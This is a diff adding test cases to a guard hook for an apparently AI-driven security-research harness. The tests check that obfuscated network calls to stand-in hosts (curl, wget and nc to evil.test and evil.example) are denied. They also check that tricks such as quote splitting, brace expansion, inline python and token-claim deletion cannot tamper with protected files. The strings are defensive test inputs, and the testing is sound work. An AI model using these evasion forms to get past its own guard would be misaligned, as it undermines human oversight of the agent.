@@ -8,7 +8,7 @@
 import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { apply, canonicalDigest, dispatchHostReason, mentionsProtected, redactHeaderLine, redactSecrets, redactUrlSecrets, scopeReasonFor, scopeSyncDirtyReason, selectToken, shapeFromArgs } from './index.js'
+import { apply, canonicalDigest, claimToken, dispatchHostReason, mentionsProtected, redactHeaderLine, redactSecrets, redactUrlSecrets, scopeReasonFor, scopeSyncDirtyReason, selectToken, shapeFromArgs } from './index.js'
 
 let passed = 0
 const failures = []
@@ -778,6 +778,105 @@ check('unreadable scope: fetch-shaped call with a non-URL string denied (fail cl
 check('plain file read allowed even with an unreadable scope (no URL, no host reference)',
   (await h.preExecute(exec('read', { file_path: 'README.md' }, osRoot))).kind === 'allow')
 rmSync(engagement, { recursive: true, force: true })
+writeFileSync(engagement, 'scope:\n  assets: [t.example, "*.wild.example"]\n')
+
+// ---- v8.1 enforcement-boundary red cases (Spec + Standards review) ----
+setRunning()
+check('timeout-prefixed curl denied',
+  (await h.preExecute(exec('bash', { command: 'timeout 5 curl http://evil.test/' }, osRoot))).kind === 'deny')
+check('xargs-piped curl denied',
+  (await h.preExecute(exec('bash', { command: 'printf x | xargs curl http://evil.test/' }, osRoot))).kind === 'deny')
+check('nohup-prefixed wget denied',
+  (await h.preExecute(exec('bash', { command: 'nohup wget http://evil.test/x &' }, osRoot))).kind === 'deny')
+check('time-prefixed nc denied',
+  (await h.preExecute(exec('bash', { command: 'time nc evil.test 443' }, osRoot))).kind === 'deny')
+check('nice-prefixed curl denied',
+  (await h.preExecute(exec('bash', { command: 'nice curl http://evil.test/' }, osRoot))).kind === 'deny')
+check('net word in an argument position stays allowed',
+  (await h.preExecute(exec('bash', { command: 'cat notes-curl.txt' }, osRoot))).kind === 'allow')
+check('mid-token quote redirect denied (11_runtime/"events.jsonl")',
+  !!h.guardReason(exec('bash', { command: 'echo x > 11_runtime/"events.jsonl"' }, osRoot)))
+check('mid-token quote redirect denied ("11_runtime"/events.jsonl)',
+  !!h.guardReason(exec('bash', { command: 'echo x > "11_runtime"/events.jsonl' }, osRoot)))
+check('mid-token quote redirect denied (11_runtim"e"/events.jsonl)',
+  !!h.guardReason(exec('bash', { command: 'echo x > 11_runtim"e"/events.jsonl' }, osRoot)))
+check('mid-token quote append denied',
+  !!h.guardReason(exec('bash', { command: 'echo x >> 11_runtime/"events.jsonl"' }, osRoot)))
+check('nested brace expansion to a protected file denied',
+  !!h.guardReason(exec('bash', { command: 'rm -rf 11_runtime/{x,{events.jsonl,y}}' }, osRoot)))
+check('find -exec inline interpreter denied',
+  !!h.guardReason(exec('bash', { command: `find . -exec python3 -c "open('11_runtime/events.jsonl','a').write('x')" ;` }, osRoot)))
+check('nohup inline interpreter denied',
+  !!h.guardReason(exec('bash', { command: `nohup python3 -c "open('11_runtime/events.jsonl','a').write('x')" &` }, osRoot)))
+check('xargs inline interpreter denied',
+  !!h.guardReason(exec('bash', { command: `printf x | xargs -I{} python3 -c "open('11_runtime/events.jsonl','a').write('x')"` }, osRoot)))
+check('sudo env inline interpreter denied',
+  !!h.guardReason(exec('bash', { command: `sudo env python3 -c "open('11_runtime/events.jsonl','a').write('x')"` }, osRoot)))
+check('schemeless evil.example/localhost denied (no path-substring exemption)',
+  (await h.preExecute(exec('bash', { command: 'curl evil.example/localhost' }, osRoot))).kind === 'deny')
+check('schemeless wget evil.example/localhost denied',
+  (await h.preExecute(exec('bash', { command: 'wget evil.example/localhost' }, osRoot))).kind === 'deny')
+check("header-valued localhost does not exempt (curl -H 'X: localhost' evil.example denied)",
+  (await h.preExecute(exec('bash', { command: "curl -H 'X: localhost' evil.example" }, osRoot))).kind === 'deny')
+check('schemeless loopback stays allowed (curl localhost:3000)',
+  (await h.preExecute(exec('bash', { command: 'curl localhost:3000' }, osRoot))).kind === 'allow')
+check('npx playwright test https://evil.example/localhost denied (path never exempts)',
+  (await h.preExecute(exec('bash', { command: 'npx playwright test https://evil.example/localhost' }, osRoot))).kind === 'deny')
+check('chromium bare out-of-scope destination denied',
+  (await h.preExecute(exec('bash', { command: 'chromium evil.example' }, osRoot))).kind === 'deny')
+check('open -a Safari bare out-of-scope destination denied',
+  (await h.preExecute(exec('bash', { command: 'open -a Safari evil.example' }, osRoot))).kind === 'deny')
+check('chromium with no destination stays allowed',
+  (await h.preExecute(exec('bash', { command: 'chromium --no-sandbox' }, osRoot))).kind === 'allow')
+check('open -a Google Chrome with no destination stays allowed',
+  (await h.preExecute(exec('bash', { command: 'open -a "Google Chrome"' }, osRoot))).kind === 'allow')
+check('rm -rf 11_runtime/.token-claims denied',
+  !!h.guardReason(exec('bash', { command: 'rm -rf 11_runtime/.token-claims' }, osRoot)))
+check('rm of a token-claim file denied',
+  !!h.guardReason(exec('bash', { command: 'rm 11_runtime/.token-claims/abc123' }, osRoot)))
+check('sibling non-claim path stays allowed (rm 11_runtime/.token-claims-backup)',
+  !h.guardReason(exec('bash', { command: 'rm 11_runtime/.token-claims-backup' }, osRoot)))
+{
+  const claimTok = { nonce: 'conformance-claim-1' }
+  const first = claimToken(osRoot, claimTok)
+  const second = claimToken(osRoot, claimTok)
+  check('second claim of one nonce reports already-claimed (EEXIST)',
+    first.ok === true && second.ok === false && second.error.includes('already claimed'))
+  try { rmSync(join(osRoot, '11_runtime', '.token-claims', 'conformance-claim-1'), { force: true }) } catch {}
+  const fileRoot = mkdtempSync(join(tmpdir(), 'claim-file-root-'))
+  writeFileSync(join(fileRoot, '11_runtime'), 'file-not-dir')
+  const other = claimToken(fileRoot, { nonce: 'conformance-claim-2' })
+  check('a non-EEXIST claim failure fails closed with an honest message',
+    other.ok === false && !other.error.includes('already claimed') && /failing closed/i.test(other.error))
+  rmSync(fileRoot, { recursive: true, force: true })
+}
+check('write to a token-claim file denied',
+  !!h.guardReason(exec('write', { file_path: '11_runtime/.token-claims/abc123', content: '{}' }, osRoot)))
+check('WHATWG disagreement denies (https://t.exämple/ punycode split)',
+  !!scopeReasonFor(osRoot, 'https://t.exämple/'))
+check('whitespace in a URL authority denies instead of stripping (fail closed)',
+  !!scopeReasonFor(osRoot, 'https://t.example /a'))
+check('DIRTY reason carries a single research_os_browser prefix',
+  (() => {
+    const savedSocket = process.env.RESEARCH_OS_BROKER_SOCKET
+    const savedHome = process.env.RESEARCH_OS_BROKER_HOME
+    const fakeSocket = join(sandbox, 'prefix-broker.sock')
+    writeFileSync(fakeSocket, '')
+    writeFileSync(join(osRoot, '11_runtime', '.scope-sync-dirty'),
+      JSON.stringify({ revision: 'EV-000001:0', reason: 'prefix probe' }))
+    try {
+      delete process.env.RESEARCH_OS_BROKER_HOME
+      process.env.RESEARCH_OS_BROKER_SOCKET = fakeSocket
+      const reason = scopeSyncDirtyReason(osRoot) || ''
+      return (reason.match(/research_os_browser:/g) || []).length === 1
+    } finally {
+      rmSync(join(osRoot, '11_runtime', '.scope-sync-dirty'), { force: true })
+      if (savedSocket === undefined) delete process.env.RESEARCH_OS_BROKER_SOCKET
+      else process.env.RESEARCH_OS_BROKER_SOCKET = savedSocket
+      if (savedHome === undefined) delete process.env.RESEARCH_OS_BROKER_HOME
+      else process.env.RESEARCH_OS_BROKER_HOME = savedHome
+    }
+  })())
 writeFileSync(engagement, 'scope:\n  assets: [t.example, "*.wild.example"]\n')
 
 // ---- web-fetch gate: browser/automation fetch tools are target access too ----------
